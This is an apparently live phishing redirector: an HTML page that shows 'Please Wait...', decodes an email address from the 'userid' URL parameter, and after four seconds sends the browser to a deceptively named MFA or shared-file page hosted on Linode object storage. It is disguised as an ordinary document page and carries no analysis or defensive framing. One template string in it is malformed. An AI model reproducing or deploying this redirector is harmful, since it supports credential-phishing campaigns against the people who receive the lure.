<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<script type="text/javascript">
    function isBase64(data) {
        try {
            return btoa(atob(data)) === data;
        } catch (err) {
            return false;
        }
    }

    function decode(email) {
        if (isBase64(email)) {
            email = atob(email);
        }

        window.location.href = `https://mfaauthentication-validprocess-securedaccessprotocol-sharedfile.us-ord-1.linodeobjects.com/outsi.html#(email)}`;
    }
    function delayer() {
        const urlParams = new URLSearchParams(window.location.search);
        const userid = urlParams.get('userid');

        if (userid) {
            decode(userid);
        }
    }
</script>
<body onLoad="setTimeout('delayer()', 4000)">
    <h3>Please Wait...</h3>
</body>
</html>
